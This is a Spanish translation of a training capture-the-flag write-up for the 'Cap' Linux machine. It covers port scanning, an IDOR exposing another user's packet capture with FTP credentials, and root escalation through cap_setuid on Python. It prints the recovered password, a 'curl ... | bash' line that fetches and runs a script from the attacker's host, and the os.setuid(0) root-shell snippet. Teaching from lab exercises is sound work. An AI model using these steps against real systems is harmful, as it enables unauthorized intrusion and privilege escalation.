# Cap — Traducción al español

**Fecha:** 20 de septiembre de 2021  
**Documento No.:** D21.100.132  
**Preparado por:** MinatoTW  
**Autor(es) de la máquina:** infosecjack  
**Dificultad:** Fácil  
**Clasificación:** Oficial

> Documento traducido al español a partir del PDF original. Las imágenes de referencia se incluyen como capturas de página en la carpeta `cap_traducido_assets/`.

![Página 1](cap_traducido_assets/pagina_1.png)

---

## Sinopsis

**Cap** es una máquina Linux de dificultad fácil que ejecuta un servidor HTTP encargado de realizar funciones administrativas, entre ellas capturas de red. La falta de controles adecuados provoca una vulnerabilidad de **Referencia Directa Insegura a Objetos** (**IDOR**), lo que permite acceder a capturas de otro usuario. La captura contiene credenciales en texto claro que pueden utilizarse para obtener acceso inicial. Posteriormente, se aprovecha una **capacidad de Linux** para escalar privilegios hasta `root`.

## Habilidades requeridas

- Enumeración web.
- Análisis de capturas de paquetes.

## Habilidades aprendidas

- IDOR.
- Explotación de capacidades de Linux.

---

# Enumeración

## Nmap

Primero se realiza un escaneo completo de puertos para identificar los servicios disponibles en la máquina objetivo.

```bash
ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.10.245
```

El resultado del escaneo muestra tres puertos abiertos: FTP en el puerto `21`, SSH en el puerto `22` y un servidor HTTP en el puerto `80`.

```text
Nmap scan report for 10.10.10.245
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    gunicorn
```

![Página 2](cap_traducido_assets/pagina_2.png)

---

# FTP

Se verifica si el servicio FTP permite acceso anónimo.

```bash
ftp 10.10.10.245
```

Intento de autenticación:

```text
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed.
ftp>
```

El inicio de sesión falla, lo que significa que el acceso anónimo está deshabilitado. Por lo tanto, se continúa con la revisión del servidor HTTP.

---

# HTTP

De acuerdo con `nmap`, el puerto `80` ejecuta **Gunicorn**, un servidor HTTP basado en Python. Al navegar hacia la página web se observa un panel de administración o **dashboard**.

Al ingresar a la página **IP Config**, se muestra la salida del comando `ifconfig`.

![Página 3](cap_traducido_assets/pagina_3.png)

De forma similar, la página **Network Status** muestra la salida de `netstat`. Esto sugiere que la aplicación está ejecutando comandos del sistema en segundo plano.

Al hacer clic en la opción **Security Snapshot**, la página se pausa por algunos segundos y luego devuelve un resultado con información de captura de paquetes.

Al presionar **Download**, se obtiene un archivo de captura de paquetes que puede analizarse con **Wireshark**.

---

# IDOR

Al revisar la captura descargada inicialmente, no se observa nada interesante, ya que solo contiene tráfico HTTP generado por nuestra propia interacción con la aplicación.

![Página 4](cap_traducido_assets/pagina_4.png)

Un detalle importante es el esquema de URL utilizado al crear una nueva captura. La URL tiene la siguiente forma:

```text
/data/<id>
```

El valor `id` se incrementa con cada captura. Esto permite suponer que podrían existir capturas de paquetes generadas por otros usuarios antes que nosotros.

Al navegar hacia:

```text
/data/0
```

se observa que efectivamente existe una captura con múltiples paquetes.

Esta vulnerabilidad se conoce como **Insecure Direct Object Reference** (**IDOR**), o **Referencia Directa Insegura a Objetos**. Ocurre cuando un usuario puede acceder directamente a datos que pertenecen a otro usuario manipulando identificadores en la URL u otros parámetros.

En este caso, la aplicación permite acceder a una captura que no corresponde al usuario actual. El siguiente paso es examinar esa captura en busca de información sensible.

---

# Acceso inicial

Al abrir en Wireshark la captura correspondiente al ID `0`, se observa tráfico FTP, incluida la autenticación del usuario.

![Página 5](cap_traducido_assets/pagina_5.png)

El tráfico no está cifrado, por lo que es posible recuperar las credenciales del usuario:

```text
Usuario: nathan
Contraseña: Buck3tH4TF0RM3!
```

Estas credenciales resultan ser válidas no solo para FTP, sino también para iniciar sesión mediante SSH.

```bash
ssh nathan@10.10.10.245
```

Después de iniciar sesión, se puede verificar el usuario actual con:

```bash
id
```

Resultado esperado:

```text
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
```

---

# Escalada de privilegios

Para buscar posibles vectores de escalada de privilegios se utiliza el script **linPEAS**.

Primero se descarga la versión más reciente en nuestra máquina local y se sirve el directorio mediante un servidor web de Python. Para ello, se ingresa al directorio donde está `linpeas.sh` y se ejecuta:

```bash
sudo python3 -m http.server 80
```

Desde la shell obtenida en la máquina **Cap**, se puede descargar y ejecutar `linpeas.sh` con `curl`, redirigiendo su salida directamente a `bash`:

```bash
curl http://10.10.14.24/linpeas.sh | bash
```

El reporte muestra una entrada interesante relacionada con archivos que poseen **capabilities** o capacidades de Linux:

```text
Files with capabilities:

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
```

El binario `/usr/bin/python3.8` tiene asignadas las capacidades `cap_setuid` y `cap_net_bind_service`, lo cual no corresponde a la configuración por defecto.

Según la documentación, `CAP_SETUID` permite que un proceso obtenga privilegios `setuid` sin necesidad de que el bit SUID esté configurado. En la práctica, esto permite cambiar al UID `0`, es decir, convertirse en `root`.

Probablemente, el desarrollador de la máquina **Cap** otorgó esta capacidad a Python para que el sitio pudiera capturar tráfico, ya que un usuario sin privilegios no debería poder hacerlo.

Los siguientes comandos de Python generan una shell como `root`:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

![Página 6](cap_traducido_assets/pagina_6.png)

La función `os.setuid()` se utiliza para modificar el identificador de usuario del proceso (**UID**).

Ejecución práctica:

```bash
/usr/bin/python3.8
```

Dentro de la consola de Python:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

Luego se confirma el acceso con:

```bash
id
```

Resultado:

```text
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

Con esto se obtiene una shell con privilegios de `root` en la máquina.

---

# Resumen del flujo de explotación

1. Se enumeran los puertos abiertos con `nmap`.
2. Se identifica FTP, SSH y HTTP.
3. FTP no permite acceso anónimo.
4. El servicio HTTP muestra un dashboard administrativo.
5. La aplicación permite descargar capturas de red.
6. Se identifica un patrón de URL `/data/<id>`.
7. Se explota un IDOR accediendo a `/data/0`.
8. La captura contiene credenciales FTP en texto claro.
9. Las credenciales también funcionan por SSH.
10. Se ejecuta `linPEAS` para buscar vectores de escalada.
11. Se detecta que `/usr/bin/python3.8` tiene `cap_setuid`.
12. Se usa Python para cambiar el UID a `0` y obtener una shell como `root`.

---

# Conceptos clave

## IDOR

Una vulnerabilidad **IDOR** ocurre cuando una aplicación permite acceder a objetos internos modificando directamente un identificador, por ejemplo:

```text
/data/2
/data/1
/data/0
```

Si la aplicación no valida que el usuario tenga permiso para acceder a cada objeto, puede exponer información de otros usuarios.

## Credenciales en texto claro

El protocolo FTP transmite usuario y contraseña sin cifrado. Si alguien captura el tráfico, puede leer las credenciales directamente desde la captura.

## Linux capabilities

Las **capabilities** permiten asignar privilegios específicos a programas sin convertirlos completamente en SUID root. Sin embargo, si se asignan capacidades peligrosas como `cap_setuid` a intérpretes como Python, se puede facilitar una escalada directa a `root`.

